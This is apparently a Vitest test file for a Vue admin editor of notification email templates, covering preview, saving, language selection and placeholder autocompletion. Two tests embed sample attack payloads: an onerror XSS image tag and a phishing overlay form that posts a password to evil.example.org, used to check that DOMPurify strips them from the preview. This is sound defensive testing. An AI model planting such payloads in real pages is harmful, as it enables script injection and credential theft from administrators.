// happy-dom (the global test environment of this project) implements the
// DOM API too incompletely for DOMPurify - payloads are not
// removed reliably. Only this file therefore runs under jsdom.
// @vitest-environment jsdom
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'
import { mount, flushPromises, type VueWrapper, type DOMWrapper } from '@vue/test-utils'
import { fetchMock as stubFetch, type FetchMock } from '../../test-support/fetchStub'
import type { MyPage } from '../../types/api'
import i18n from '../../i18n'
import { useAuth } from '../../composables/useAuth'
import { useTenant } from '../../composables/useTenant'
import { onyxFormStubs } from '../../test-support/onyxStubs'
import AdminNotificationTemplates from './AdminNotificationTemplates.vue'
import { axe } from '../../test-support/axe'
import { stubConfirm } from '../../test-support/confirm'

// previewBody comes from the backend preview endpoint (admin-editable
// BodyHTML with Go template placeholders) and is rendered via v-html. These
// tests cover that an XSS payload in the preview HTML is removed by
// DOMPurify before rendering, while harmless markup is kept.

function jsonResponse(body: unknown, status = 200) {
  return { ok: status < 400, status, json: async () => body }
}

const customTemplate = {
  Kind: 'incident_created', Audience: 'staff', Language: 'en',
  Subject: 'Eigener Betreff', BodyHTML: '<p>Eigener Text</p>', UpdatedAt: '2026-08-01T10:00:00Z',
}

interface FetchRouterOptions {
  previewOverride?: unknown
  templates?: Record<string, unknown>[]
  writeOk?: boolean
  previewOk?: boolean
}

interface MountOptions {
  fetchImpl?: FetchMock
  tenantId?: string | null
  attachTo?: HTMLElement
  globalAdmin?: boolean
}

type Option = { label: string; value: string }

// The component state the tests read and drive directly.
interface NotificationTemplatesVm {
  selectedKind: string
  selectedAudience: string
  selectedLanguage: string
  subject: string
  body: string
  kindOptions: Option[]
  availableLanguageOptions: Option[]
  placeholders: { name: string; key: string; desc: string }[]
  hasCustomTemplate: boolean
  sanitizedPreviewBody: string
  isSaving: boolean
  isPreviewing: boolean
  isResetting: boolean
  preview: () => Promise<void>
  save: () => Promise<void>
  resetToDefault: () => Promise<void>
}
const vmOf = (wrapper: VueWrapper) => wrapper.vm as unknown as NotificationTemplatesVm

function makeFetchRouter({ previewOverride, templates = [], writeOk = true, previewOk = true }: FetchRouterOptions = {}) {
  return stubFetch(async (input, options = {}) => {
    const url = String(input)
    const method = options.method || 'GET'
    if (method === 'GET' && /\/notification-templates$/.test(String(url))) {
      return jsonResponse(templates)
    }
    if ((method === 'PUT' || method === 'DELETE') && /\/notification-templates\//.test(url)) {
      return writeOk ? jsonResponse({}) : jsonResponse({ error: 'Schreiben fehlgeschlagen' }, 500)
    }
    if (method === 'POST' && /\/preview$/.test(url) && !previewOk) {
      return jsonResponse({ error: 'Vorschau kaputt' }, 500)
    }
    if (method === 'GET' && /\/languages$/.test(url)) {
      return jsonResponse([])
    }
    if (method === 'POST' && /\/preview$/.test(url)) {
      return jsonResponse(previewOverride ?? { subject: 'Test-Betreff', bodyHTML: '<p>Harmloser Text</p>' })
    }
    throw new Error(`Unerwarteter Fetch-Aufruf: ${method} ${url}`)
  })
}

let activeWrapper: VueWrapper | null = null

async function mountView({ fetchImpl, tenantId = '1', attachTo, globalAdmin = true }: MountOptions = {}) {
  useAuth().setAuth('jwt-1', { email: 'a@b.de', is_global_admin: globalAdmin })
  useTenant().setActiveTenant(tenantId)
  global.fetch = fetchImpl || makeFetchRouter()

  const wrapper = mount(AdminNotificationTemplates, {
    global: { plugins: [i18n], stubs: onyxFormStubs },
    attachTo,
  })
  await flushPromises()
  activeWrapper = wrapper
  return { wrapper }
}

describe('AdminNotificationTemplates', () => {
  beforeEach(() => {
    useAuth().logout()
    useTenant().setActiveTenant(null)
    vi.spyOn(console, 'error').mockImplementation(() => {})
    i18n.global.locale.value = 'de'
  })

  afterEach(() => {
    activeWrapper?.unmount()
    activeWrapper = null
    vi.restoreAllMocks()
  })

  // Direction C: editor and preview sit in cards with a card header.
  it('zeigt den Editor in einer Karte mit Kopf und Hinweis, ob eine eigene Vorlage aktiv ist', async () => {
    const { wrapper } = await mountView()
    expect(wrapper.find('.comp-card__title').text()).toBe('Vorlage bearbeiten')
    expect(wrapper.find('.comp-card__head .tag-pill').text()).toBe('Standardvorlage')
    expect(wrapper.find('.comp-card__head .tag-pill--accent').exists()).toBe(false)

    const { wrapper: custom } = await mountView({ fetchImpl: makeFetchRouter({ templates: [customTemplate] }) })
    expect(custom.find('.comp-card__head .tag-pill--accent').text()).toBe('Eigene Vorlage')
  })

  // The three selects (kind, audience, language) write their value
  // back into the state and then show the matching custom template.
  it('wählt über die drei Auswahlfelder Typ, Zielgruppe und Sprache die passende Vorlage', async () => {
    const { wrapper } = await mountView({ fetchImpl: makeFetchRouter({ templates: [customTemplate] }) })
    const accent = () => wrapper.find('.comp-card__head .tag-pill--accent').exists()
    expect(accent()).toBe(true)

    const selects = wrapper.findAll('.onyx-select-stub select')
    expect(selects).toHaveLength(3)
    await selects[0].setValue('incident_updated')
    expect(vmOf(wrapper).selectedKind).toBe('incident_updated')
    expect(accent()).toBe(false)
    await selects[0].setValue('incident_created')
    await selects[1].setValue('subscriber')
    expect(vmOf(wrapper).selectedAudience).toBe('subscriber')
    expect(accent()).toBe(false)
    await selects[1].setValue('staff')
    await selects[2].setValue('de')
    expect(vmOf(wrapper).selectedLanguage).toBe('de')
    expect(accent()).toBe(false)
    await selects[2].setValue('en')
    expect(accent()).toBe(true)
  })

  it('lässt den Editor-Kasten überlaufen, damit die Platzhalter-Vorschläge nicht abgeschnitten werden', async () => {
    const { wrapper } = await mountView()
    expect(wrapper.find('section.comp-card').classes()).toContain('comp-card--visible')
  })

  // Regression 2026-10-29: after "Preview" the view stayed at the top with the
  // success message; one had to search for the preview below the form.
  it('springt nach der Vorschau zur Vorschau und setzt den Fokus auf deren Überschrift', async () => {
    const scrollSpy = vi.fn()
    const orig = Element.prototype.scrollIntoView
    Element.prototype.scrollIntoView = scrollSpy
    try {
      const { wrapper } = await mountView({ attachTo: document.body })
      vmOf(wrapper).subject = '{{.Title}}'
      vmOf(wrapper).body = '<p>{{.Message}}</p>'
      await vmOf(wrapper).preview()
      await flushPromises()

      const heading = wrapper.find('h3.preview-heading')
      expect(heading.exists()).toBe(true)
      expect(scrollSpy).toHaveBeenCalledTimes(1)
      expect(scrollSpy.mock.contexts[0]).toBe(heading.element)
      expect(scrollSpy).toHaveBeenCalledWith({ behavior: 'smooth', block: 'start' })
      expect(document.activeElement).toBe(heading.element)
    } finally {
      Element.prototype.scrollIntoView = orig
    }
  })

  it('springt nicht, wenn die Vorschau leer zurückkommt (kein Vorschau-Block)', async () => {
    const scrollSpy = vi.fn()
    const orig = Element.prototype.scrollIntoView
    Element.prototype.scrollIntoView = scrollSpy
    try {
      const { wrapper } = await mountView({ fetchImpl: makeFetchRouter({ previewOverride: { subject: '', bodyHTML: '' } }) })
      vmOf(wrapper).subject = '{{.Title}}'
      vmOf(wrapper).body = '<p>x</p>'
      await vmOf(wrapper).preview()
      await flushPromises()
      expect(wrapper.find('h3.preview-heading').exists()).toBe(false)
      expect(scrollSpy).not.toHaveBeenCalled()
    } finally {
      Element.prototype.scrollIntoView = orig
    }
  })

  it('springt bei fehlgeschlagener Vorschau nicht', async () => {
    const scrollSpy = vi.fn()
    const orig = Element.prototype.scrollIntoView
    Element.prototype.scrollIntoView = scrollSpy
    try {
      const { wrapper } = await mountView({ fetchImpl: makeFetchRouter({ previewOk: false }) })
      vmOf(wrapper).subject = '{{.Title}}'
      vmOf(wrapper).body = '<p>x</p>'
      await vmOf(wrapper).preview()
      await flushPromises()
      expect(scrollSpy).not.toHaveBeenCalled()
    } finally {
      Element.prototype.scrollIntoView = orig
    }
  })

  it('strips <script> payloads from the preview HTML before rendering', async () => {
    const { wrapper } = await mountView({
      fetchImpl: makeFetchRouter({
        previewOverride: {
          subject: 'Betreff',
          bodyHTML: '<p>Hallo</p><img src=x onerror="window.__xss=true">',
        },
      }),
    })

    vmOf(wrapper).subject = '[ALERT] {{.IncidentTitle}}'
    vmOf(wrapper).body = '<p>{{.Message}}</p>'
    await vmOf(wrapper).preview()
    await flushPromises()

    const previewHtml = wrapper.find('.comp-card:last-of-type .form-group:last-of-type div').html()
    expect(previewHtml).toContain('Hallo')
    expect(previewHtml).not.toContain('onerror')
    expect(previewHtml).not.toContain('<script')
    expect((window as unknown as { __xss?: unknown }).__xss).toBeUndefined()
  })

  // A template with a form, an input field and an image must not appear in the
  // preview as a phishing mask for other admins.
  it('zeigt Formulare, Eingabefelder, Bilder und Style-Blöcke aus der Vorlage nicht in der Vorschau', async () => {
    const payload = '<style>.ph{position:fixed;inset:0;background:#fff;z-index:99999}</style>' +
      '<form class="ph" action="https://evil.example.org/collect" method="post">Sitzung abgelaufen - bitte Passwort eingeben' +
      '<input type="password" name="pw"><button>Anmelden</button></form><img src="https://evil.example.org/beacon.gif"><p>Hallo</p>'
    const { wrapper } = await mountView({
      fetchImpl: makeFetchRouter({ previewOverride: { subject: 'S', bodyHTML: payload } }),
    })
    vmOf(wrapper).subject = 'x'
    vmOf(wrapper).body = 'y'
    await vmOf(wrapper).preview()
    await flushPromises()

    const box = wrapper.findAll('.preview-box').at(-1)!
    expect(box.text()).toContain('Hallo')
    for (const tag of ['form', 'input', 'button', 'img', 'style']) {
      expect(box.find(tag)!.exists(), tag).toBe(false)
    }
  })

  it('keeps harmless formatting markup intact', async () => {
    const { wrapper } = await mountView()

    vmOf(wrapper).subject = '[ALERT] {{.IncidentTitle}}'
    vmOf(wrapper).body = '<p>{{.Message}}</p>'
    await vmOf(wrapper).preview()
    await flushPromises()

    expect(vmOf(wrapper).sanitizedPreviewBody).toBe('<p>Harmloser Text</p>')
  })

  // Loading -> error case -> saving/resetting/preview are explicitly
  // awaited via flushPromises, so that coverage does not depend on
  // timing.
  it('füllt den Editor aus der vorhandenen Vorlage und zeigt den Hinweis auf die eigene Vorlage', async () => {
    const { wrapper } = await mountView({ fetchImpl: makeFetchRouter({ templates: [customTemplate] }) })

    expect(vmOf(wrapper).subject).toBe('Eigener Betreff')
    expect(vmOf(wrapper).body).toBe('<p>Eigener Text</p>')
    expect(vmOf(wrapper).hasCustomTemplate).toBe(true)

    vmOf(wrapper).selectedKind = 'incident_updated'
    await flushPromises()
    expect(vmOf(wrapper).subject).toBe('')
    expect(vmOf(wrapper).hasCustomTemplate).toBe(false)
  })

  it('zeigt eine Fehlermeldung, wenn das Laden fehlschlägt', async () => {
    const fetchImpl = stubFetch(async () => jsonResponse({ error: 'kaputt' }, 500))
    const { wrapper } = await mountView({ fetchImpl })

    expect(wrapper.find('.alert-error').exists()).toBe(true)
  })

  it('speichert per PUT und lädt die Vorlagen neu; ohne Pflichtfelder wird nicht gespeichert', async () => {
    const fetchMock = makeFetchRouter()
    const { wrapper } = await mountView({ fetchImpl: fetchMock })

    await wrapper.find('form.edit-form').trigger('submit.prevent')
    await flushPromises()
    expect(wrapper.find('.alert-warning').exists()).toBe(true)
    expect(fetchMock.mock.calls.some(([, o]) => o?.method === 'PUT')).toBe(false)

    vmOf(wrapper).subject = 'Betreff'
    vmOf(wrapper).body = '<p>Text</p>'
    await wrapper.find('form.edit-form').trigger('submit.prevent')
    await flushPromises()

    const put = fetchMock.mock.calls.find(([, o]) => o?.method === 'PUT')!
    expect(put[0]).toBe('/api/pages/1/notification-templates/incident_created/staff/en')
    expect(JSON.parse(String(put[1]?.body))).toEqual({ Subject: 'Betreff', BodyHTML: '<p>Text</p>' })
    expect(wrapper.find('.alert-success').exists()).toBe(true)
    expect(fetchMock.mock.calls.filter(([, o]) => !o?.method).length).toBeGreaterThanOrEqual(2)
  })

  it('zeigt eine Fehlermeldung, wenn das Speichern fehlschlägt', async () => {
    const { wrapper } = await mountView({ fetchImpl: makeFetchRouter({ writeOk: false }) })

    vmOf(wrapper).subject = 'Betreff'
    vmOf(wrapper).body = '<p>Text</p>'
    await wrapper.find('form.edit-form').trigger('submit.prevent')
    await flushPromises()

    expect(wrapper.find('.alert-error').text()).toContain('Schreiben fehlgeschlagen')
    expect(vmOf(wrapper).isSaving).toBe(false)
  })

  it('setzt eine eigene Vorlage nach Bestätigung per DELETE zurück, ohne eigene Vorlage nur mit Hinweis', async () => {
    const fetchMock = makeFetchRouter({ templates: [customTemplate] })
    const { wrapper } = await mountView({ fetchImpl: fetchMock })

    stubConfirm(false)
    await vmOf(wrapper).resetToDefault()
    await flushPromises()
    expect(fetchMock.mock.calls.some(([, o]) => o?.method === 'DELETE')).toBe(false)

    stubConfirm(true)
    await vmOf(wrapper).resetToDefault()
    await flushPromises()
    expect(fetchMock).toHaveBeenCalledWith(
      '/api/pages/1/notification-templates/incident_created/staff/en',
      expect.objectContaining({ method: 'DELETE' }),
    )
    expect(wrapper.find('.alert-success').exists()).toBe(true)

    vmOf(wrapper).selectedKind = 'incident_updated'
    await flushPromises()
    await vmOf(wrapper).resetToDefault()
    expect(wrapper.find('.alert-info').exists()).toBe(true)
  })

  it('zeigt eine Fehlermeldung, wenn das Zurücksetzen fehlschlägt', async () => {
    stubConfirm(true)
    const { wrapper } = await mountView({ fetchImpl: makeFetchRouter({ templates: [customTemplate], writeOk: false }) })

    await vmOf(wrapper).resetToDefault()
    await flushPromises()

    expect(wrapper.find('.alert-error').text()).toContain('Schreiben fehlgeschlagen')
    expect(vmOf(wrapper).isResetting).toBe(false)
  })

  it('verlangt für die Vorschau Pflichtfelder und meldet Vorschau-Fehler', async () => {
    const { wrapper } = await mountView({ fetchImpl: makeFetchRouter({ previewOk: false }) })

    await vmOf(wrapper).preview()
    await flushPromises()
    expect(wrapper.find('.alert-warning').exists()).toBe(true)

    vmOf(wrapper).subject = 'Betreff'
    vmOf(wrapper).body = '<p>Text</p>'
    await vmOf(wrapper).preview()
    await flushPromises()
    expect(wrapper.find('.alert-error').text()).toContain('Vorschau kaputt')
    expect(vmOf(wrapper).isPreviewing).toBe(false)
  })

  // The double opt-in confirmation mail is editable as a kind of its
  // own and comes with the {{.ConfirmURL}} placeholder.
  it('bietet die Abonnement-Bestätigungsmail als Kind und den ConfirmURL-Platzhalter an', async () => {
    const { wrapper } = await mountView()

    expect(vmOf(wrapper).kindOptions).toContainEqual({ label: 'Abonnement-Bestätigung (Double-Opt-in)', value: 'subscription_confirm' })
    expect(vmOf(wrapper).placeholders).toContainEqual({ name: 'ConfirmURL', key: '{{.ConfirmURL}}', desc: 'Bestätigungslink des Abonnements (nur Abonnement-Bestätigung)' })
  })

  // The six events about external reports and the placeholders
  // SourceName/SourceURL were valid in the backend but not selectable in the editor.
  it('bietet die Ereignisse externer Meldungen und die Quellen-Platzhalter an und stellt die Zielgruppe um', async () => {
    const { wrapper } = await mountView()

    const values = vmOf(wrapper).kindOptions.map(o => o.value)
    for (const kind of ['incident', 'maintenance']) {
      for (const action of ['created', 'updated', 'resolved']) {
        expect(values).toContain(`external_${kind}_${action}`)
      }
    }
    const names = vmOf(wrapper).placeholders.map(p => p.name)
    expect(names).toContain('SourceName')
    expect(names).toContain('SourceURL')

    expect(vmOf(wrapper).selectedAudience).toBe('staff')
    vmOf(wrapper).selectedKind = 'external_incident_created'
    await flushPromises()
    expect(vmOf(wrapper).selectedAudience).toBe('subscriber')
  })

  it('verwendet die Sprachen der Statusseite als Auswahl', async () => {
    const fetchImpl = stubFetch(async (url) => (/\/notification-templates$/.test(String(url))
      ? jsonResponse([])
      : jsonResponse([{ ID: 1, LanguageCode: 'fr', IsDefault: true }])))
    const { wrapper } = await mountView({ fetchImpl })

    expect(vmOf(wrapper).availableLanguageOptions).toEqual([{ label: 'fr', value: 'fr' }])
  })

  // With the translation switch off the backend offers only the page default language (mostly
  // "de"); the editor must not stay on "en", or it opens empty and saving answers 409.
  it('selects the page default language when the current language is not offered', async () => {
    const fetchImpl = stubFetch(async (url, options = {}) => {
      if ((options.method || 'GET') === 'PUT') return jsonResponse({})
      if (/\/notification-templates$/.test(String(url))) {
        return jsonResponse([{ ...customTemplate, Language: 'de', Subject: 'Deutscher Betreff' }])
      }
      return jsonResponse([{ ID: 1, LanguageCode: 'de', IsDefault: true }])
    })
    const { wrapper } = await mountView({ fetchImpl })

    expect(vmOf(wrapper).selectedLanguage).toBe('de')
    expect(vmOf(wrapper).subject).toBe('Deutscher Betreff')
    await vmOf(wrapper).save()
    const put = fetchImpl.mock.calls.find(([, o]) => o?.method === 'PUT')!
    expect(put[0]).toMatch(/\/notification-templates\/incident_created\/staff\/de$/)
  })

  it('falls back to the first offered language when the page marks no default', async () => {
    const fetchImpl = stubFetch(async (url) => (/\/notification-templates$/.test(String(url))
      ? jsonResponse([])
      : jsonResponse([{ ID: 1, LanguageCode: 'de', IsDefault: false }])))
    const { wrapper } = await mountView({ fetchImpl })

    expect(vmOf(wrapper).selectedLanguage).toBe('de')
  })

  it('keeps the selected language when the page offers it', async () => {
    const fetchImpl = stubFetch(async (url) => (/\/notification-templates$/.test(String(url))
      ? jsonResponse([])
      : jsonResponse([{ ID: 1, LanguageCode: 'de', IsDefault: true }, { ID: 2, LanguageCode: 'en', IsDefault: false }])))
    const { wrapper } = await mountView({ fetchImpl })

    expect(vmOf(wrapper).selectedLanguage).toBe('en')
  })

  it('hat keine axe-Funde im Editor', async () => {
    const { wrapper } = await mountView()
    expect(await axe(wrapper)).toHaveNoViolations()
  })
})

// Inserting placeholders by click, autocompletion on `{`
// and the native required-field message "Please fill out this field.".
describe('AdminNotificationTemplates – Platzhalter', () => {
  beforeEach(() => {
    useAuth().logout()
    useTenant().setActiveTenant(null)
    i18n.global.locale.value = 'de'
    // jsdom has no scrollIntoView; the suggestion list calls it for the
    // active entry.
    Element.prototype.scrollIntoView = vi.fn()
  })

  afterEach(() => {
    activeWrapper?.unmount()
    activeWrapper = null
    delete (Element.prototype as Partial<Element>).scrollIntoView
    vi.restoreAllMocks()
  })

  const mountAttached = () => mountView({ attachTo: document.body })
  const insertButton = (wrapper: VueWrapper, key: string) => wrapper.find(`button[aria-label="Platzhalter ${key} einfügen"]`)

  // Simulate typing: set value and cursor, fire the input event (bubbles
  // to the wrapper as in the browser; the stub updates the v-model).
  async function typeInto(field: DOMWrapper<Element>, value: string, cursor = value.length) {
    const element = field.element as HTMLInputElement | HTMLTextAreaElement
    element.value = value
    element.setSelectionRange(cursor, cursor)
    await field.trigger('input')
  }

  it('übergibt die Beispielwerte als echte Strings statt als wörtlichen Mustache-Code', async () => {
    const { wrapper } = await mountView()
    expect(wrapper.findComponent(onyxFormStubs.OnyxInput).props('placeholder')).toBe('[ALERT] {{.ComponentNames}}: {{.IncidentTitle}}')
    expect(wrapper.findComponent(onyxFormStubs.OnyxTextarea).props('placeholder')).toBe('<p>{{.Message}}</p>')
  })

  it('schaltet die native Formularvalidierung ab, damit Chrome kein „Fülle dieses Feld aus.“ zeigt', async () => {
    const { wrapper } = await mountView()
    const form = wrapper.find<HTMLFormElement>('form.edit-form')
    expect(form.element.noValidate).toBe(true)
    // The own, translated message still applies.
    await form.trigger('submit.prevent')
    expect(wrapper.find('.alert-warning').text()).toBe('Betreff und Body sind Pflichtfelder.')
  })

  it('rendert jeden Platzhalter als Button mit verständlichem aria-label', async () => {
    const { wrapper } = await mountView()
    const buttons = wrapper.findAll('.placeholder-list button')
    expect(buttons).toHaveLength(vmOf(wrapper).placeholders.length)
    expect(buttons[0].attributes('type')).toBe('button')
    expect(buttons[0].attributes('aria-label')).toBe('Platzhalter {{.Title}} einfügen')
    expect(buttons[0].text()).toBe('{{.Title}}')
  })

  it('fügt per Klick ohne vorher fokussiertes Feld ans Ende des Bodys ein', async () => {
    const { wrapper } = await mountAttached()
    vmOf(wrapper).body = '<p>Hallo</p>'
    await flushPromises()

    await insertButton(wrapper, '{{.Message}}').trigger('click')
    await flushPromises()

    const textarea = wrapper.find('textarea').element
    expect(vmOf(wrapper).body).toBe('<p>Hallo</p>{{.Message}}')
    expect(document.activeElement).toBe(textarea)
    expect(textarea.selectionStart).toBe(vmOf(wrapper).body.length)
  })

  it('fügt per Klick an der Cursorposition des zuletzt fokussierten Felds ein und ersetzt die Auswahl', async () => {
    const { wrapper } = await mountAttached()
    vmOf(wrapper).subject = 'Störung: X heute'
    await flushPromises()
    const input = wrapper.find('input').element
    input.focus()
    input.setSelectionRange(9, 10)

    await insertButton(wrapper, '{{.Title}}').trigger('click')
    await flushPromises()

    expect(vmOf(wrapper).subject).toBe('Störung: {{.Title}} heute')
    expect(vmOf(wrapper).body).toBe('')
    expect(document.activeElement).toBe(input)
    expect(input.selectionStart).toBe(19)
    expect(input.selectionEnd).toBe(19)
  })

  it('öffnet bei `{` die Vorschlagsliste, filtert und bedient sie per Tastatur', async () => {
    const { wrapper } = await mountAttached()
    const input = wrapper.find('input')
    const listbox = wrapper.find('#notification-template-subject-listbox')
    expect(input.attributes('role')).toBe('combobox')
    expect(input.attributes('aria-expanded')).toBe('false')
    expect(input.attributes('aria-controls')).toBe('notification-template-subject-listbox')
    expect(listbox.isVisible()).toBe(false)

    input.element.focus()
    await typeInto(input, 'Neu: {')
    expect(listbox.isVisible()).toBe(true)
    expect(input.attributes('aria-expanded')).toBe('true')
    expect(listbox.findAll('[role="option"]')).toHaveLength(vmOf(wrapper).placeholders.length)

    await typeInto(input, 'Neu: {{.Sta')
    const options = listbox.findAll('[role="option"]')
    expect(options.map(o => o.find('code').text())).toEqual(['{{.Status}}', '{{.StatusLabel}}'])
    expect(options[0].text()).toContain('Roher Status-Wert')
    expect(input.attributes('aria-activedescendant')).toBe('notification-template-subject-option-0')
    expect(options[0].attributes('aria-selected')).toBe('true')

    await input.trigger('keydown', { key: 'ArrowDown' })
    expect(input.attributes('aria-activedescendant')).toBe('notification-template-subject-option-1')
    expect(options[1].attributes('aria-selected')).toBe('true')
    await flushPromises()
    expect(Element.prototype.scrollIntoView).toHaveBeenCalledWith({ block: 'nearest' })

    await input.trigger('keydown', { key: 'Enter' })
    await flushPromises()
    expect(vmOf(wrapper).subject).toBe('Neu: {{.StatusLabel}}')
    expect(input.element.selectionStart).toBe(21)
    expect(listbox.isVisible()).toBe(false)
    expect(input.attributes('aria-activedescendant')).toBeUndefined()
  })

  it('schließt die Liste mit Escape, beim Verlassen des Felds und wenn der Cursor das Präfix verlässt', async () => {
    const { wrapper } = await mountAttached()
    const textarea = wrapper.find('textarea')
    const listbox = wrapper.find('#notification-template-body-listbox')
    expect(textarea.attributes('role')).toBeUndefined()
    expect(textarea.attributes('aria-autocomplete')).toBe('list')

    textarea.element.focus()
    await typeInto(textarea, '{{')
    expect(listbox.isVisible()).toBe(true)
    await textarea.trigger('keydown', { key: 'Escape' })
    expect(listbox.isVisible()).toBe(false)
    expect(vmOf(wrapper).body).toBe('{{')

    await typeInto(textarea, '{{')
    await textarea.trigger('focusout')
    expect(listbox.isVisible()).toBe(false)

    await typeInto(textarea, 'a {{')
    textarea.element.setSelectionRange(1, 1)
    await textarea.trigger('keyup', { key: 'ArrowLeft' })
    expect(listbox.isVisible()).toBe(false)

    await typeInto(textarea, 'a {{')
    textarea.element.setSelectionRange(1, 1)
    await textarea.trigger('click')
    expect(listbox.isVisible()).toBe(false)
  })

  it('übernimmt einen Vorschlag per Klick und ersetzt das Präfix', async () => {
    const { wrapper } = await mountAttached()
    const textarea = wrapper.find('textarea')
    textarea.element.focus()
    await typeInto(textarea, '<p>{{.Me</p>', 8)

    const option = wrapper.find('#notification-template-body-listbox [role="option"]')
    await option.trigger('mousedown')
    await option.trigger('click')
    await flushPromises()

    expect(vmOf(wrapper).body).toBe('<p>{{.Message}}</p>')
    expect(document.activeElement).toBe(textarea.element)
    expect(textarea.element.selectionStart).toBe(15)

    // A click also inserts into the subject.
    const input = wrapper.find('input')
    input.element.focus()
    await typeInto(input, '{')
    await wrapper.find('#notification-template-subject-listbox [role="option"]').trigger('click')
    await flushPromises()
    expect(vmOf(wrapper).subject).toBe('{{.Title}}')
  })

  it('hat mit geöffneter Vorschlagsliste und aufgeklappter Platzhalterliste keine axe-Funde', async () => {
    const { wrapper } = await mountAttached()
    wrapper.find('details').element.open = true
    const input = wrapper.find('input')
    input.element.focus()
    await typeInto(input, '{{.')
    expect(wrapper.find('#notification-template-subject-listbox').isVisible()).toBe(true)
    expect(await axe(wrapper)).toHaveNoViolations()
  })

  // The preview is a read action in the backend (notification_templates:read); a
  // viewer saw the button despite a 403 on loading.
  it('blendet Speichern und Zurücksetzen ohne notification_templates:update/delete aus, die Vorschau bleibt', async () => {
    useTenant().setMyPages([{ ID: 1, Permissions: 'components:read,incidents:read,notices:read' } as MyPage])
    const { wrapper } = await mountView({ globalAdmin: false })
    const labels = wrapper.findAll('button').map(b => b.text())
    expect(labels).not.toContain('Speichern')
    expect(labels).not.toContain('Zurücksetzen')
    // The preview only renders and is a read action; it stays available to every reader.
    expect(labels).toContain('Vorschau')
    useTenant().setMyPages([])
  })

  it('zeigt die Vorschau mit notification_templates:update auf der Seite', async () => {
    useTenant().setMyPages([{ ID: 1, Permissions: 'notification_templates:update,notification_templates:delete' } as MyPage])
    const { wrapper } = await mountView({ globalAdmin: false })
    expect(wrapper.findAll('button').map(b => b.text())).toContain('Vorschau')
    useTenant().setMyPages([])
  })
  // After "Reset to default" the fields immediately showed "Required field" (Onyx remembers the
  // change at the field). The fields must be freshly mounted so that they are pristine.
  it('mountet das Formular nach dem Zurücksetzen auf Default neu, damit die Felder unberührt sind', async () => {
    stubConfirm(true)
    const { wrapper } = await mountView({ fetchImpl: makeFetchRouter({ templates: [customTemplate] }) })
    const before = wrapper.find('form.edit-form').element

    await vmOf(wrapper).resetToDefault()
    await flushPromises()

    expect(wrapper.find('form.edit-form').element).not.toBe(before)
  })
})
